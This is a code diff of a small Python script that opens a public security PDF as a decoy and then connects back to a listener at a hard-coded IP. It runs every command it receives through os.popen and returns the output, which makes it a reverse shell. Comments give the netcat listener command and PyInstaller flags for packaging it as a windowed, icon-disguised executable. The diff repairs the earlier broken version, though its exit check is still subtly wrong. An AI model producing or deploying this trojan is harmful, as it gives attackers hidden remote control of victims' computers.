@@ -1,22 +1,26 @@
-from socket import socket
+import socket
 from os import popen
 
-url = 'https://cartilha.cert.br/livro/cartilha-seguranca-internet.pdf'
+url = 'https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-207.pdf'
 
 popen(f'explorer {url}')
 
-ip = '192.168.0.10'
+ip = '192.168.15.47'
 port = 80
 
-sckt = socket(socket.AF_INET, socket.SOCK_STREAM)
-sckt.connect((ip, port))
+try:
+    sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sckt.connect((ip, port))
 
-while True:
-    cmd = sckt.recv(1024)
-    if cmd == '':
-        exit
-    for opt in popen(cmd):
-        sckt.send(cmd)
+    while True:
+        cmd = sckt.recv(1024)
+        if cmd.decode('utf-8').lower() >= 'exit':
+            break
+        for opt in popen(cmd.decode('utf-8')):
+            sckt.send(opt.encode('utf-8'))
+except:
+    exit()
 
+# nc -vnlp 80
 # pip install pyinstaller
 # pyinstaller <path/file.exe> --onefile --windowed --icon=<path/file.ico>
